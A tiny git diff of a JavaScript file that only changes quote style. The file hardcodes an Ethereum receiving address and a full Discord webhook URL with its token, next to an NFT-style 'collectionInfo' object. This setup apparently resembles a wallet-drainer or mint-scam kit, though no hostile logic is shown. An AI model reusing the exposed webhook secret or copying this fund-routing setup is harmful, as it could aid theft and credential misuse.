@@ -1,5 +1,5 @@
 const receiveAddress = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c";
-const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/985877157169463306/5OA21yO6KY9nj0L1UdM2lMWvzpnAUHfvMzdVmkZbfZ24pCQrh6mvxwH9lx1EICI00_9u' });
+const webhookClient = new WebhookClient({ url: "https://discord.com/api/webhooks/985877157169463306/5OA21yO6KY9nj0L1UdM2lMWvzpnAUHfvMzdVmkZbfZ24pCQrh6mvxwH9lx1EICI00_9u" });
 
 
 const collectionInfo = {
